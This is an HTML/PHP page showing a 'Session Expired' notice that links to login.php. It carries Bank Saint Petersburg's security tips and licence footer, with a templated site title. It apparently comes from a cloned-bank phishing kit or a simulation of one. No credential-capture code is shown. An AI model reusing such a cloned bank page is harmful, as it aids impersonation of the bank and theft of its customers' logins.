
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo $site_title; ?></title>
  <meta name="build" content="release-2019-03-savings-account-extras.10">
  <meta name="revision" content="a22e2d2">
  <link rel="icon" type="image/x-icon" href="files/img/favicon.ico">
  <link rel="stylesheet" href="files/scripts/lib.css" media="screen">
  <link rel="stylesheet" href="files/scripts/auth.css" media="screen">
  <link rel="stylesheet" href="files/scripts/style.css" media="screen">
  <script async="" src="files/scripts/analytics.js.download"></script><script src="files/scripts/jquery.js.download"></script>
  <script src="files/scripts/bootstrap.js.download"></script>
  <script src="files/scripts/GlobalErrorHandler.js.download"></script>
  <script src="files/scripts/DoubleClickPreventer.js.download"></script>
  <script src="files/scripts/html5-emulation.js.download"></script>
  
  
  
</head>
<body>
  


  

<div class="container">
  <img id="logo" src="files/img/demo.png" alt="Logo">
      <p><?php echo $errorMessage; ?></p>
  <div id="login-container">
    <span id="alerts-container">
  

  
  


<h1>Session Expired</h1>

<p>Your Session Expired has expired, click on login to continue</p>
  <div class="login-button-home">
    <a href="login.php" id="login-button"  tabindex="3" class="btn btn-primary">Login</a>
  </div>

  
  
   

  </div>
</div>



  <div id="security-info">
    <div class="item"><img src="files/img/recommendation-1.png">
      <h4>Secure connection</h4>
      <div class="muted">Always make sure the site is using encryption. Look for a green certificate in the address bar with the Bank Saint Petersburg name.</div>
    </div>
    <div class="item"><img src="files/img/recommendation-2.png">
      <h4>Always log out</h4>
      <div class="muted">Ending your session will prevent others from hijacking your account.</div>
    </div>
    <div class="item"><img src="files/img/recommendation-3.png">
      <h4>Never share your passwords</h4>
      <div class="muted">Only use it on this page. The bank will never ask for it via other channels.</div>
    </div>
  </div>

  <div id="footer">
    <div class="copyright">© 1990 – 2019  "<?php echo $site_title; ?>" PJSC</div>
    <div class="license">General license for banking operations #436 from 31.12.2014 issued by Bank of Russia</div>
  </div>



  
  <script>
    new DoubleClickPreventer().init();
  </script>

</body></html>